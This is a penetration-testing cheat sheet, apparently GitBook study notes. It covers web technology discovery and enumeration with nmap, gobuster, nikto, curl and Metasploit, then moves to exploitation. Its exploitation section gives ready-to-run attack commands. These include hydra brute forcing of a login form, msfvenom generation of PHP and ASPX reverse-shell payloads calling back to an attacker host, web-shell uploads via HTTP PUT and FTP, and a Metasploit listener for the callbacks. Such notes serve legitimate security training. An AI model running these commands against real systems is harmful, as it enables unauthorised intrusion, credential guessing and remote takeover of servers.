# WEB

## Manual Technology Discovery

### Source Code

A common technique for discovering a technology used on a site is to **view a source code** and search for the word "**Generator**"

<figure><img src="../../../../.gitbook/assets/image (140).png" alt=""><figcaption><p>In this case the website is created with CMS Made Simple.</p></figcaption></figure>

Once we have identified the technology and the version, we can **googling** for exploit or vulnerabilities.

### Cookies

Check the **cookies** on the website ti find out some useful information.

<figure><img src="../../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Sometimes the name of the cookies can help you to understand the technology used.
{% endhint %}

## Web enumeration tools

### Vulnerability Scan

```bash
nmap --script vuln -p 80 IP
```

### Enum Tools

```bash
# NMAP
sudo nmap -p 80 -sV -O <TARGET_IP>


nmap -p 80 --script=http-headers -sV <TARGET_IP>
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>
nmap -p 80 --script=banner -sV IP
```



```bash
whatweb IP
http IP
browsh --startup-url http://IP

# Dirbuster
dirb http://IP
dirb http://IP /usr/share/metasploit-framework/data/wordlists/directory.txt

# Gobuster
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -b 403,404
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
gobuster dir -u http://IP/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
gobuster dir -u IP/directory -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -r -U admin -P admin
# avoid cert check
gobuster dir -u IP/directory -w ... -k

# Nikto
nikto -h http://IP -o niktoscan.txt
nikto -h http://IP/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm

wget IP

# CUrl
curl IP | more
curl -I http://IP/DIR
curl --digest -u USER:PASS http://IP/DIR

curl -X GET IP
curl -X OPTIONS IP -v
curl -X POST IP
curl -X POST IP/login.php -d "name=john&password=password" -v
curl -X PUT IP

curl IP/uploads/ --upload-file hello.txt
curl -X DELETE IP/uploads/hello.txt -v

# LYNX
lynx IP
```

{% code title="Metasploit HTTP enumeration" %}
```bash

use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/files_dir
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/apache_userdir_enum

# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

## set options depends on the selected module
set HTTP_METHOD GET
set TARGETURI /<DIR>/

set USER_FILE <USERS_LIST>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set AUTH_URI /<DIR>/
exploit
```
{% endcode %}

### WMAP Vuln Scan

```bash
# load the wmap plug in in msfconsole
load wmap

# create a site
wmap_sites -a IP
# specify target
wmap_targets -t URL
# list of modules
wmap_run -t
# run detect modules
wmap_run -e
# display web vulns
wmap_vulns -l
```

### OWASP ZAP

Open the app, insert URL and run ATTACK scan.

## Web Exploitation

### HTTP Login Brute Force&#x20;

{% code overflow="wrap" %}
```bash
# first check the source code of the web page
# check the request method (POST,GET,...)
# check the login variable (user, password)
# check the error response in case of invalid creds

# use hydra tool to do login brute force
hydra -L usernames -P passwords IP http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
```
{% endcode %}

### Put file in '/uploads' folder

```bash
#! copy a revshell in php  
cp /usr/share/webshells/php/php-reverse-shell.php .
# or generate a payload 
msfvenom -p php/meterpreter_reverse_tcp lhost=IP lport=PORT -o shell.php

# Request to upload a file with revshell
curl http://IP/uploads/ --upload-file php-reverse-shell.php

# Delete file uploaded
curl -X DELETE http://IP/uploads/php-reverse-shell.php
```

### Backdoor Web via FTP

**Required:**

* WebServer connection via FTP
* User permissions to add file in web directory&#x20;

```bash
# Prepare the shell
ls -la /usr/share/webshells/
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
# Once we're in a web dir via ftp
put shell.php
```

```bash
# .aspx Payload
## create payload
msfvenom -p windows/shell/reverse_tcp LHOST=ATT_IP LPORT=ATT_PORT -f asp > shell.aspx
## -p: paylaod to use
## LHOST: attacker ip
## LPORT: attacker listener port
## -f: output format

## put payload via ftp (in ftp connection)
put shell.aspx

# set up msfconsole handler
service postgresql start && msfconsole
use multi/handler
set payload windows/shell/reverse_tcp
set LHOST ATT_IP
set LPORT ATT_PORT
```

### Targeting PHP

```bash
# PHP Enum file
/phpinfo.php


# Search vulnerable php version
searchsploit php cgi
## Select a exploit and copy it
searchsploit -m EXPLOIT_ID
vim EXPLOIT_ID
```

